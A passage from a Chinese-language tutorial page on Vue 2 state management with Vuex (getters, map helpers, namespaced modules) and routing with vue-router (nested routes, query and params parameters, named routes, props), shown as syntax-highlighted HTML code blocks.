class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;decrement&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;odd&quot;</span>&gt;</span>当前求和为奇数再加<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;incrementWait&quot;</span>&gt;</span>等一等再加<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="attr">name</span>:<span class="string">&#x27;Count&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="keyword">return</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">n</span>:<span class="number">1</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="attr">methods</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="function"><span class="title">increment</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="built_in">this</span>.$store.commit(<span class="string">&#x27;JIA&#x27;</span>,<span class="built_in">this</span>.n)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="function"><span class="title">decrement</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="built_in">this</span>.$store.commit(<span class="string">&#x27;JIAN&#x27;</span>,<span class="built_in">this</span>.n)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="function"><span class="title">odd</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="built_in">this</span>.$store.dispatch(<span class="string">&#x27;jiaOdd&#x27;</span>,<span class="built_in">this</span>.n)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="function"><span class="title">incrementWait</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="built_in">this</span>.$store.dispatch(<span class="string">&#x27;jiaWait&#x27;</span>,<span class="built_in">this</span>.n)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">&#x27;css&#x27;</span>&gt;</span><span class="css"></span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-tag">button</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml">    <span class="attribute">margin-left</span>: <span class="number">5px</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"></span></span></span><br><span class="line"><span class="css"><span class="xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>组件中读取vuex中的数据：<code>$store.state.sum</code></p></li><li><p>组件中修改vuex中的数据：<code>$store.dispatch(&#39;action中的方法名&#39;,数据)</code> 或 <code>$store.commit(&#39;mutations中的方法名&#39;,数据)</code></p><blockquote><p> 备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写<code>dispatch</code>，直接编写<code>commit</code></p></blockquote></li></ol><h3 id="5-getters的使用"><a href="#5-getters的使用" class="headerlink" title="5.getters的使用"></a>5.getters的使用</h3><ol><li><p>概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。</p></li><li><p>在<code>store.js</code>中追加<code>getters</code>配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getters = &#123;</span><br><span class="line"><span class="function"><span class="title">bigSum</span>(<span class="params">state</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> state.sum * <span class="number">10</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建并暴露store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">......</span><br><span class="line">getters</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>组件中读取数据：<code>$store.getters.bigSum</code></p></li></ol><h3 id="6-四个map方法的使用"><a href="#6-四个map方法的使用" class="headerlink" title="6.四个map方法的使用"></a>6.四个map方法的使用</h3><ol><li><p><strong>mapState方法：</strong>用于帮助我们映射<code>state</code>中的数据为计算属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;mapState&#125; <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line">    <span class="comment">//借助mapState生成计算属性：sum、school、subject（对象写法）</span></span><br><span class="line">     ...mapState(&#123;<span class="attr">sum</span>:<span class="string">&#x27;sum&#x27;</span>,<span class="attr">school</span>:<span class="string">&#x27;school&#x27;</span>,<span class="attr">subject</span>:<span class="string">&#x27;subject&#x27;</span>&#125;),</span><br><span class="line">         </span><br><span class="line">    <span class="comment">//借助mapState生成计算属性：sum、school、subject（数组写法）</span></span><br><span class="line">    ...mapState([<span class="string">&#x27;sum&#x27;</span>,<span class="string">&#x27;school&#x27;</span>,<span class="string">&#x27;subject&#x27;</span>]),</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li><li><p><strong>mapGetters方法：</strong>用于帮助我们映射<code>getters</code>中的数据为计算属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">    <span class="comment">//借助mapGetters生成计算属性：bigSum（对象写法）</span></span><br><span class="line">    ...mapGetters(&#123;<span class="attr">bigSum</span>:<span class="string">&#x27;bigSum&#x27;</span>&#125;),</span><br><span class="line"></span><br><span class="line">    <span class="comment">//借助mapGetters生成计算属性：bigSum（数组写法）</span></span><br><span class="line">    ...mapGetters([<span class="string">&#x27;bigSum&#x27;</span>])</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li><li><p><strong>mapActions方法：</strong>用于帮助我们生成与<code>actions</code>对话的方法，即：包含<code>$store.dispatch(xxx)</code>的函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">methods:&#123;</span><br><span class="line">    <span class="comment">//靠mapActions生成：incrementOdd、incrementWait（对象形式）</span></span><br><span class="line">    ...mapActions(&#123;<span class="attr">incrementOdd</span>:<span class="string">&#x27;jiaOdd&#x27;</span>,<span class="attr">incrementWait</span>:<span class="string">&#x27;jiaWait&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//靠mapActions生成：incrementOdd、incrementWait（数组形式）</span></span><br><span class="line">    ...mapActions([<span class="string">&#x27;jiaOdd&#x27;</span>,<span class="string">&#x27;jiaWait&#x27;</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>mapMutations方法：</strong>用于帮助我们生成与<code>mutations</code>对话的方法，即：包含<code>$store.commit(xxx)</code>的函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">methods:&#123;</span><br><span class="line">    <span class="comment">//靠mapActions生成：increment、decrement（对象形式）</span></span><br><span class="line">    ...mapMutations(&#123;<span class="attr">increment</span>:<span class="string">&#x27;JIA&#x27;</span>,<span class="attr">decrement</span>:<span class="string">&#x27;JIAN&#x27;</span>&#125;),</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//靠mapMutations生成：JIA、JIAN（对象形式）</span></span><br><span class="line">    ...mapMutations([<span class="string">&#x27;JIA&#x27;</span>,<span class="string">&#x27;JIAN&#x27;</span>]),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。</p></blockquote><h3 id="7-模块化-命名空间"><a href="#7-模块化-命名空间" class="headerlink" title="7.模块化+命名空间"></a>7.模块化+命名空间</h3><ol><li><p>目的：让代码更好维护，让多种数据分类更加明确。</p></li><li><p>修改<code>store.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> countAbout = &#123;</span><br><span class="line">  <span class="attr">namespaced</span>:<span class="literal">true</span>,<span class="comment">//开启命名空间</span></span><br><span class="line">  <span class="attr">state</span>:&#123;<span class="attr">x</span>:<span class="number">1</span>&#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123; ... &#125;,</span><br><span class="line">  <span class="attr">actions</span>: &#123; ... &#125;,</span><br><span class="line">  <span class="attr">getters</span>: &#123;</span><br><span class="line">    <span class="function"><span class="title">bigSum</span>(<span class="params">state</span>)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> state.sum * <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> personAbout = &#123;</span><br><span class="line">  <span class="attr">namespaced</span>:<span class="literal">true</span>,<span class="comment">//开启命名空间</span></span><br><span class="line">  <span class="attr">state</span>:&#123; ... &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123; ... &#125;,</span><br><span class="line">  <span class="attr">actions</span>: &#123; ... &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  <span class="attr">modules</span>: &#123;</span><br><span class="line">    countAbout,</span><br><span class="line">    personAbout</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>开启命名空间后，组件中读取state数据：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方式一：自己直接读取</span></span><br><span class="line"><span class="built_in">this</span>.$store.state.personAbout.list</span><br><span class="line"><span class="comment">//方式二：借助mapState读取：</span></span><br><span class="line">...mapState(<span class="string">&#x27;countAbout&#x27;</span>,[<span class="string">&#x27;sum&#x27;</span>,<span class="string">&#x27;school&#x27;</span>,<span class="string">&#x27;subject&#x27;</span>]),</span><br></pre></td></tr></table></figure></li><li><p>开启命名空间后，组件中读取getters数据：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方式一：自己直接读取</span></span><br><span class="line"><span class="built_in">this</span>.$store.getters[<span class="string">&#x27;personAbout/firstPersonName&#x27;</span>]</span><br><span class="line"><span class="comment">//方式二：借助mapGetters读取：</span></span><br><span class="line">...mapGetters(<span class="string">&#x27;countAbout&#x27;</span>,[<span class="string">&#x27;bigSum&#x27;</span>])</span><br></pre></td></tr></table></figure></li><li><p>开启命名空间后，组件中调用dispatch</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方式一：自己直接dispatch</span></span><br><span class="line"><span class="built_in">this</span>.$store.dispatch(<span class="string">&#x27;personAbout/addPersonWang&#x27;</span>,person)</span><br><span class="line"><span class="comment">//方式二：借助mapActions：</span></span><br><span class="line">...mapActions(<span class="string">&#x27;countAbout&#x27;</span>,&#123;<span class="attr">incrementOdd</span>:<span class="string">&#x27;jiaOdd&#x27;</span>,<span class="attr">incrementWait</span>:<span class="string">&#x27;jiaWait&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure></li><li><p>开启命名空间后，组件中调用commit</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方式一：自己直接commit</span></span><br><span class="line"><span class="built_in">this</span>.$store.commit(<span class="string">&#x27;personAbout/ADD_PERSON&#x27;</span>,person)</span><br><span class="line"><span class="comment">//方式二：借助mapMutations：</span></span><br><span class="line">...mapMutations(<span class="string">&#x27;countAbout&#x27;</span>,&#123;<span class="attr">increment</span>:<span class="string">&#x27;JIA&#x27;</span>,<span class="attr">decrement</span>:<span class="string">&#x27;JIAN&#x27;</span>&#125;),</span><br></pre></td></tr></table></figure></li></ol><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202203171057359.png" alt="image-20220317105734046"></p><ol><li>理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。</li><li>前端路由：key是路径，value是组件。</li><li>vue-router是vue的一个插件库，专门来实现SPA(single page web application)</li><li>SPA:只有<strong>一个页面</strong>，<strong>点击链接不会跳转页面，只会局部更新</strong>，数据<strong>通过ajax实现</strong>。</li></ol><h3 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1.基本使用"></a>1.基本使用</h3><ol><li><p>安装vue-router，命令：<code>npm i vue-router</code></p></li><li><p>应用插件：<code>Vue.use(VueRouter)</code></p></li><li><p>编写router配置项:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引入VueRouter</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="comment">//引入Luyou 组件</span></span><br><span class="line"><span class="keyword">import</span> About <span class="keyword">from</span> <span class="string">&#x27;../components/About&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Home <span class="keyword">from</span> <span class="string">&#x27;../components/Home&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建router实例对象，去管理一组一组的路由规则</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line"><span class="attr">routes</span>:[</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:About</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:Home</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//暴露router</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure></li><li><p>实现切换（active-class可配置高亮样式）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link active-class=&quot;active&quot; to=&quot;/about&quot;&gt;About&lt;/router-link&gt;</span><br></pre></td></tr></table></figure></li><li><p>指定展示位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-view&gt;&lt;/router-view&gt;</span><br></pre></td></tr></table></figure></li></ol><h3 id="2-几个注意点"><a href="#2-几个注意点" class="headerlink" title="2.几个注意点"></a>2.几个注意点</h3><ol><li><p>路由组件通常存放在<code>pages</code>文件夹，一般组件通常存放在<code>components</code>文件夹。</p></li><li><p>通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。</p></li><li><p>每个组件都有自己的<code>$route</code>属性，里面存储着自己的路由信息。</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202203171645912.png" alt="image-20220317164513944"></p></li><li><p>整个应用只有一个router，可以通过组件的<code>$router</code>属性获取到。</p></li></ol><h3 id="3-多级路由（多级路由）"><a href="#3-多级路由（多级路由）" class="headerlink" title="3.多级路由（多级路由）"></a>3.多级路由（多级路由）</h3><ol><li><p>配置路由规则，使用children配置项：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">routes:[</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:About,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:Home,</span><br><span class="line"><span class="attr">children</span>:[ <span class="comment">//通过children配置子级路由</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;news&#x27;</span>, <span class="comment">//此处一定不要写：/news</span></span><br><span class="line"><span class="attr">component</span>:News</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;message&#x27;</span>,<span class="comment">//此处一定不要写：/message</span></span><br><span class="line"><span class="attr">component</span>:Message</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>跳转（要写完整路径）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link to=&quot;/home/news&quot;&gt;News&lt;/router-link&gt;</span><br></pre></td></tr></table></figure></li></ol><h3 id="4-路由的query参数"><a href="#4-路由的query参数" class="headerlink" title="4.路由的query参数"></a>4.路由的query参数</h3><ol><li><p>传递参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 跳转并携带query参数，to的字符串写法 --&gt;</span><br><span class="line">&lt;router-link :to=&quot;/home/message/detail?id=666&amp;title=你好&quot;&gt;跳转&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 跳转并携带query参数，to的对象写法 --&gt;</span><br><span class="line">&lt;router-link </span><br><span class="line">:to=&quot;&#123;</span><br><span class="line">path:&#x27;/home/message/detail&#x27;,</span><br><span class="line">query:&#123;</span><br><span class="line">   id:666,</span><br><span class="line">            title:&#x27;你好&#x27;</span><br><span class="line">&#125;</span><br><span class="line">&#125;&quot;</span><br><span class="line">&gt;跳转&lt;/router-link&gt;</span><br></pre></td></tr></table></figure></li><li><p>接收参数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$route.query.id</span><br><span class="line">$route.query.title</span><br></pre></td></tr></table></figure></li></ol><h3 id="5-命名路由"><a href="#5-命名路由" class="headerlink" title="5.命名路由"></a>5.命名路由</h3><ol><li><p>作用：可以简化路由的跳转。</p></li><li><p>如何使用</p><ol><li><p>给路由命名：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;/demo&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:Demo,</span><br><span class="line"><span class="attr">children</span>:[</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;test&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:Test,</span><br><span class="line"><span class="attr">children</span>:[</span><br><span class="line">&#123;</span><br><span class="line">                      <span class="attr">name</span>:<span class="string">&#x27;hello&#x27;</span> <span class="comment">//给路由命名</span></span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;welcome&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:Hello,</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>简化跳转：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--简化前，需要写完整的路径 --&gt;</span><br><span class="line">&lt;router-link to=&quot;/demo/test/welcome&quot;&gt;跳转&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--简化后，直接通过名字跳转 --&gt;</span><br><span class="line">&lt;router-link :to=&quot;&#123;name:&#x27;hello&#x27;&#125;&quot;&gt;跳转&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--简化写法配合传递参数 --&gt;</span><br><span class="line">&lt;router-link </span><br><span class="line">:to=&quot;&#123;</span><br><span class="line">name:&#x27;hello&#x27;,</span><br><span class="line">query:&#123;</span><br><span class="line">   id:666,</span><br><span class="line">            title:&#x27;你好&#x27;</span><br><span class="line">&#125;</span><br><span class="line">&#125;&quot;</span><br><span class="line">&gt;跳转&lt;/router-link&gt;</span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="6-路由的params参数"><a href="#6-路由的params参数" class="headerlink" title="6.路由的params参数"></a>6.路由的params参数</h3><ol><li><p>配置路由，声明接收params参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:Home,</span><br><span class="line"><span class="attr">children</span>:[</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;news&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:News</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">component</span>:Message,</span><br><span class="line"><span class="attr">children</span>:[</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;xiangqing&#x27;</span>,</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;detail/:id/:title&#x27;</span>, <span class="comment">//使用占位符声明接收params参数</span></span><br><span class="line"><span class="attr">component</span>:Detail</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>传递参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 跳转并携带params参数，to的字符串写法 --&gt;</span><br><span class="line">&lt;router-link :to=&quot;/home/message/detail/666/你好&quot;&gt;跳转&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 跳转并携带params参数，to的对象写法 --&gt;</span><br><span class="line">&lt;router-link </span><br><span class="line">:to=&quot;&#123;</span><br><span class="line">name:&#x27;xiangqing&#x27;,</span><br><span class="line">params:&#123;</span><br><span class="line">   id:666,</span><br><span class="line">            title:&#x27;你好&#x27;</span><br><span class="line">&#125;</span><br><span class="line">&#125;&quot;</span><br><span class="line">&gt;跳转&lt;/router-link&gt;</span><br></pre></td></tr></table></figure><blockquote><p>特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！</p></blockquote></li><li><p>接收参数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$route.params.id</span><br><span class="line">$route.params.title</span><br></pre></td></tr></table></figure></li></ol><h3 id="7-路由的props配置"><a href="#7-路由的props配置" class="headerlink" title="7.路由的props配置"></a>7.路由的props配置</h3><p>​    作用：让路由组件更方便的收到参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;xiangqing&#x27;</span>,</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;detail/:id&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:Detail,</span><br><span class="line"></span><br><span class="line"><span class="comment">//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件</span></span><br><span class="line"><span class="comment">// 